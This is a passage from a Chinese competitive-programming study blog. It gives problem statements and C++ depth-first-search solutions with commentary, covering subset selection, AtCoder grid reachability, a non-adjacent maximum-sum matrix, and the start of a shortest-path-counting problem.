class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span> <span class="comment">//懒人最爱的万能头文件 </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;<span class="comment">//名字空间 </span></span><br><span class="line"><span class="type">int</span> ans[<span class="number">1000</span>];<span class="comment">//这个数组是来存储解的。 </span></span><br><span class="line"><span class="type">int</span> a[<span class="number">1000</span>];<span class="comment">//表示牛每天需要的每种维他命的最小量。 </span></span><br><span class="line"><span class="type">int</span> b[<span class="number">1000</span>][<span class="number">1000</span>];<span class="comment">//每种饲料包含的各种维他命的量的多少。</span></span><br><span class="line"><span class="type">int</span> c[<span class="number">1000</span>];<span class="comment">//每次搜索选的饲料编号 </span></span><br><span class="line"><span class="type">int</span> n,m,minn=<span class="number">100000000</span>;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">pd</span><span class="params">(<span class="type">int</span> x)</span><span class="comment">//这是判断每次选的那些饲料中的维生素之和是不是都大于等于牛每天需要的每种维他命的最小量的函数 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>; j&lt;=x; j++)</span><br><span class="line">sum+=b[c[j]][i];<span class="comment">//用一个sum累加 </span></span><br><span class="line"><span class="keyword">if</span>(sum&lt;a[i]) <span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//如果有一项维生素比牛需要的维生素要少，直接返回false </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">search</span><span class="params">(<span class="type">int</span> t,<span class="type">int</span> s)</span><span class="comment">//搜索的函数 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(t&gt;m)<span class="comment">//边界</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">pd</span>(s))<span class="comment">//必须得满足条件</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(s&lt;minn)<span class="comment">//判断选的饲料的总数小于以前的最优解</span></span><br><span class="line">&#123;</span><br><span class="line">minn=s;<span class="comment">//替换掉</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=minn; i++)</span><br><span class="line">&#123;</span><br><span class="line">ans[i]=c[i];<span class="comment">//答案的数组也要被替换</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>; <span class="comment">//返回</span></span><br><span class="line">&#125;</span><br><span class="line">c[s+<span class="number">1</span>]=t;<span class="comment">//把t放在数组里</span></span><br><span class="line"><span class="built_in">search</span>(t+<span class="number">1</span>,s+<span class="number">1</span>);<span class="comment">//搜索一步</span></span><br><span class="line">c[s+<span class="number">1</span>]=<span class="number">0</span>;<span class="comment">//回溯一步</span></span><br><span class="line"><span class="built_in">search</span>(t+<span class="number">1</span>,s);<span class="comment">//如果不选第t种饲料的操作</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span><span class="comment">//主函数部分</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">cin&gt;&gt;n;<span class="comment">//读入</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=n; i++)</span><br><span class="line">cin&gt;&gt;a[i];<span class="comment">//读入</span></span><br><span class="line">cin&gt;&gt;m;<span class="comment">//读入</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=m; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>; j&lt;=n; j++)</span><br><span class="line">cin&gt;&gt;b[i][j];<span class="comment">//还是读入</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">search</span>(<span class="number">1</span>,<span class="number">0</span>);<span class="comment">//调用搜索函数</span></span><br><span class="line">cout&lt;&lt;minn&lt;&lt;<span class="string">&#x27; &#x27;</span>;<span class="comment">//输出</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=minn; i++)</span><br><span class="line">cout&lt;&lt;ans[i]&lt;&lt;<span class="string">&#x27; &#x27;</span>;<span class="comment">//还是输出</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//结束程序</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写这个主要是因为第一眼还是 dx，dy 类型的深搜，刚开始手足无措没有想到如何处理这种 0，1 状态的深搜使其能搜索所有的状态。</p><p>下面再贴一道纯模板题</p><hr><h1 id="深さ優先探索"><a class="markdownIt-Anchor" href="#深さ優先探索">#</a> 深さ優先探索</h1><h2 id="题面翻译"><a class="markdownIt-Anchor" href="#题面翻译">#</a> 题面翻译</h2><p>高桥先生住的小区是长方形的，被划分成一个个格子。高桥先生想从家里去鱼店，高桥先生每次可以走到他前后左右四个格子中的其中一个，但不能斜着走，也不能走出小区。</p><p>现在给出地图：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">```g```：代表鱼店</span><br><span class="line"></span><br><span class="line">```.```：代表道路</span><br><span class="line"></span><br><span class="line">```#```：代表墙壁</span><br><span class="line"></span><br><span class="line">高桥先生不能穿过墙壁。</span><br><span class="line"></span><br><span class="line">输入：第一行输入n(1&lt;=n&lt;=500),m(1&lt;=m&lt;=500)代表小区的长和宽，接下来n行每行m个字符，描述小区中的每个格子。</span><br><span class="line"></span><br><span class="line">输出：如果高桥先生能到达鱼店，输出&quot;Yes&quot;，否则输出&quot;No&quot;。</span><br><span class="line"></span><br><span class="line">## 题目描述</span><br><span class="line"></span><br><span class="line">[problemUrl]: https://atcoder.jp/contests/atc001/tasks/dfs_a</span><br><span class="line"></span><br><span class="line">この問題は、講座用問題です。ページ下部に解説が掲載されています。</span><br><span class="line"></span><br><span class="line">高橋君の住む街は長方形の形をしており、格子状の区画に区切られています。 長方形の各辺は東西及び南北に並行です。 各区画は道または塀のどちらかであり、高橋君は道を東西南北に移動できますが斜めには移動できません。 また、塀の区画は通ることができません。</span><br><span class="line"></span><br><span class="line">高橋君が、塀を壊したりすることなく道を通って魚屋にたどり着けるかどうか判定してください。</span><br><span class="line"></span><br><span class="line">## 输入格式</span><br><span class="line"></span><br><span class="line">入力は以下の形式で標準入力から与えられる。</span><br><span class="line"></span><br><span class="line">&gt; $ H $ $ W $ $ c_&#123;0,0&#125; $ $ c_&#123;0,1&#125; $ $ c_&#123;0,W-1&#125; $ $ c_&#123;1,0&#125; $ $ c_&#123;1,1&#125; $ $ c_&#123;1,W-1&#125; $ : $ c_&#123;H-1,0&#125; $ $ c_&#123;H-1,1&#125; $ $ c_&#123;H-1,W-1&#125; $</span><br><span class="line"></span><br><span class="line">- $ 1 $ 行目には、街の南北の長さとして整数 $ H(1≦H≦500) $ と東西の長さとして整数 $ W(1≦W≦500) $ が空白で区切られて与えられる。</span><br><span class="line">- $ 2 $ 行目からの $ H $ 行には、格子状の街の各区画における状態 $ c_&#123;i,j&#125;(0≦i≦H-1,\ 0≦j≦W-1) $ が与えられる。 </span><br><span class="line">  - $ i $ 行目 $ j $ 文字目の文字 $ c_&#123;i,j&#125; $ はそれぞれ `s`, `g`, `.`, `#` のいずれかで与えられ、座標 $ (j,i) $ が下記のような状態であることを表す。 </span><br><span class="line">      - `s` : その区画が家であることを表す。</span><br><span class="line">      - `g` : その区画が魚屋であることを表す。</span><br><span class="line">      - `.` : その区画が道であることを表す。</span><br><span class="line">      - `#` : その区画が塀であることを表す。</span><br><span class="line">  - 高橋君は家・魚屋・道は通ることができるが、塀は通ることができない。</span><br><span class="line">  - 与えられた街の外を通ることはできない。</span><br><span class="line">  - `s` と `g` はそれぞれ 1 つずつ与えられる。</span><br><span class="line"></span><br><span class="line">## 输出格式</span><br><span class="line"></span><br><span class="line">塀を $ 1 $ 回も壊さずに、家から魚屋まで辿り着くことができる場合は `Yes`、辿りつけない場合は `No` を標準出力に $ 1 $ 行で出力せよ。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 题解</span><br><span class="line"></span><br><span class="line">这道题就纯是最常见也是最简单的DFS了，多了一个字符串的转换，这里也可以复习一下getchar()函数和cin和scanf函数，</span><br><span class="line"></span><br><span class="line">&gt;**cin从第一个非空格、非回车、非tab键的位置开始读取，当与所要读取类型一致时则开始读取，遇上空格、tab键不再读取、回车结束。**</span><br><span class="line"></span><br><span class="line">&gt;输入缓冲区有数据：从输入缓冲区读取，从非空字符开始，遇到空格结束(回车、空格、tab)。尾回车会被留在输入缓冲区，并且不做处理。</span><br><span class="line">  输入缓冲区没有数据：获取键盘输入，当按下回车的时候，输入的数据连同刚按下的回车符被送入输入缓冲区。然后从输入缓冲区区读取数据，规则和上面标黄部分一样。</span><br><span class="line"></span><br><span class="line">&gt;1、scanf从非空格字符开始读取，空格字符结束(空格、TAB、回车)</span><br><span class="line">   2、当缓冲区没有数据的时候，需要先从键盘输入，然后放入缓冲区再读取。</span><br><span class="line">   3、当缓冲区有数据的时候不会从键盘获取数据。我们可以从上面输入看到第二个sacnf并没有从键盘获取数据</span><br><span class="line">   4、sacnf会把末尾回车留在缓冲区，给以后的输入埋雷</span><br><span class="line"></span><br><span class="line">接着贴上代码</span><br><span class="line"></span><br><span class="line">```cpp</span><br><span class="line">#include&lt;bits/stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int map1[502][502];</span><br><span class="line">int record[502][502];</span><br><span class="line">#define xx x+dx[i]</span><br><span class="line">#define yy y+dy[i]</span><br><span class="line">int sx,sy,fx,fy;</span><br><span class="line">int dx[4]=&#123;0,0,1,-1&#125;;</span><br><span class="line">int dy[4]=&#123;1,-1,0,0&#125;;</span><br><span class="line">int n,m;</span><br><span class="line">int flag=0;</span><br><span class="line">void dfs(int x,int y)&#123;</span><br><span class="line">record[x][y]=1;</span><br><span class="line">if(x==fx&amp;&amp;y==fy)&#123;</span><br><span class="line">flag=1;</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">if(!flag)</span><br><span class="line">for(int i=0;i&lt;4;i++)&#123;</span><br><span class="line">if(xx&lt;=n&amp;&amp;x&gt;0&amp;&amp;y&lt;=m&amp;&amp;y&gt;0&amp;&amp;map1[xx][yy]==0&amp;&amp;record[xx][yy]==0)&#123;</span><br><span class="line">dfs(xx,yy);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">getchar();</span><br><span class="line">for(int i=1;i&lt;=n;i++)&#123;</span><br><span class="line">for(int j=1;j&lt;=m;j++)&#123;</span><br><span class="line">char tmp;</span><br><span class="line">tmp = getchar();</span><br><span class="line">if(tmp==&#x27;s&#x27;)&#123;</span><br><span class="line">sx = i,sy = j;</span><br><span class="line">map1[i][j]=0;</span><br><span class="line">&#125;</span><br><span class="line">else if(tmp == &#x27;#&#x27;)&#123;</span><br><span class="line">map1[i][j]=1;</span><br><span class="line">&#125;</span><br><span class="line">else if(tmp == &#x27;g&#x27;)&#123;</span><br><span class="line">fx=i,fy=j;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">map1[i][j] = 0;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">getchar();</span><br><span class="line">&#125;</span><br><span class="line">dfs(sx,sy);</span><br><span class="line">if(flag)&#123;</span><br><span class="line">cout&lt;&lt;&quot;Yes&quot;&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">cout&lt;&lt;&quot;No&quot;&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再上一题 dfs，其实这一题和放的第一题是同一种类型，或者说是第一和第二的结合，在二维数组中每个元组有选和不选两种状态，这时候应该的做法。<br>先上题目：</p><h1 id="取数游戏"><a class="markdownIt-Anchor" href="#取数游戏">#</a> 取数游戏</h1><h2 id="题目描述-2"><a class="markdownIt-Anchor" href="#题目描述-2">#</a> 题目描述</h2><p>一个 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo>×</mo><mi>M</mi></mrow><annotation encoding="application/x-tex">N\times M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span> 的由非负整数构成的数字矩阵，你需要在其中取出若干个数字，使得取出的任意两个数字不相邻（若一个数字在另外一个数字相邻 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>8</mn></mrow><annotation encoding="application/x-tex">8</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">8</span></span></span></span> 个格子中的一个即认为这两个数字相邻），求取出数字和最大是多少。</p><h2 id="输入格式-2"><a class="markdownIt-Anchor" href="#输入格式-2">#</a> 输入格式</h2><p>第一行有一个正整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span>，表示了有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span> 组数据。</p><p>对于每一组数据，第一行有两个正整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span>，表示了数字矩阵为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 行 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span> 列。</p><p>接下来 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 行，每行 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span> 个非负整数，描述了这个数字矩阵。</p><h1 id="题解-2"><a class="markdownIt-Anchor" href="#题解-2">#</a> 题解</h1><p>这里不给出样例输入输出了<br>因为数据量小，直接暴力深搜。</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> T;</span><br><span class="line"><span class="type">int</span> N,M;</span><br><span class="line"><span class="type">int</span> map[<span class="number">9</span>][<span class="number">9</span>];</span><br><span class="line"><span class="type">int</span> maxsum = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> enable[<span class="number">8</span>][<span class="number">8</span>];</span><br><span class="line"><span class="type">int</span> dx[<span class="number">8</span>]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>&#125;;</span><br><span class="line"><span class="type">int</span> dy[<span class="number">8</span>]=&#123;<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;;</span><br><span class="line"><span class="type">int</span> currentsum = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> xx x+dx[i]</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> yy y+dy[i]</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">search</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(y == M+<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">search</span>(x+<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(x == N+<span class="number">1</span>)&#123;</span><br><span class="line">maxsum = <span class="built_in">max</span>(maxsum,currentsum);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">search</span>(x,y+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(enable[x][y]==<span class="number">0</span>)&#123;</span><br><span class="line">currentsum += map[x][y];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)&#123;</span><br><span class="line">enable[xx][yy]++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">search</span>(x,y+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)&#123;</span><br><span class="line">enable[xx][yy]--;</span><br><span class="line">&#125;</span><br><span class="line">currentsum-=map[x][y]; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">cin&gt;&gt;T;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=T;i++)&#123;</span><br><span class="line"><span class="comment">//memset(enable,0,sizeof(enable));</span></span><br><span class="line"><span class="comment">//memset(map,0,sizeof(map));//在做每个数据前都要初始化数组 </span></span><br><span class="line">cin&gt;&gt;N&gt;&gt;M;</span><br><span class="line">maxsum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=N;j++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">1</span>;k&lt;=M;k++)&#123;</span><br><span class="line">cin&gt;&gt;map[j][k];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">currentsum=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">search</span>(<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line">cout&lt;&lt;maxsum&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125; </span><br></pre></td></tr></table></figure><p>这里我第一次写代码时，并没有考虑到所有的情况，向上面这样写才能考虑到所有的情况，因为你需要考虑到每个元组选或不选，要在 search 中体现出来。而我第一次写代码时默认都选择，进行了 n*m 的循环寻找，自然会少一些情况。这算是本题的一点收获。</p><h2 id="题目描述-3"><a class="markdownIt-Anchor" href="#题目描述-3">#</a> 题目描述</h2><p>给出一个 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 个顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span> 条边的无向无权图，顶点编号为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>∼</mo><mi>N</mi></mrow><annotation encoding="application/x-tex">1\sim N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span>。问从顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span> 开始，到其他每个点的最短路有几条。</p><h2 id="输入格式-3"><a class="markdownIt-Anchor" href="#输入格式-3">#</a> 输入格式</h2><p>第一行包含 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span> 个正整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo separator="true">,</mo><mi>M</mi></mrow><annotation encoding="application/x-tex">N,M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span>，为图的顶点数与边数。</p><p>接下来 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span> 行，每行 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span> 个正整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo separator="true">,</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">x,y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span>，表示有一条由顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span></span></span></span> 连向顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span> 的边，请注意可能有自环与重边。</p><h2 id="输出格式-2"><a class="markdownIt-Anchor" href="#输出格式-2">#</a> 输出格式</h2><p>共 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 行，每行一个非负整数，第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathnormal">i</span></span></span></span> 行输出从顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span> 到顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathnormal">i</span></span></span></span> 有多少条不同的最短路，由于答案有可能会很大，你只需要输出 $ ans \bmod 100003$ 后的结果即可。如果无法到达顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathnormal">i</span></span></span></span> 则输出 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>。</p><h2 id="样例-1-2"><a class="markdownIt-Anchor" href="#样例-1-2">#</a> 样例 #1</h2><h3 id="样例输入-1-2"><a class="markdownIt-Anchor" href="#样例输入-1-2">#</a> 样例输入 #1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5 7</span><br><span class="line">1 2</span><br><span class="line">1 3</span><br><span class="line">2 4</span><br><span class="line">3 4</span><br><span class="line">2 3</span><br><span class="line">4 5</span><br><span class="line">4 5</span><br></pre></td></tr></table></figure><h3 id="样例输出-1-2"><a class="markdownIt-Anchor" href="#样例输出-1-2">#</a> 样例输出 #1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">1</span><br><span 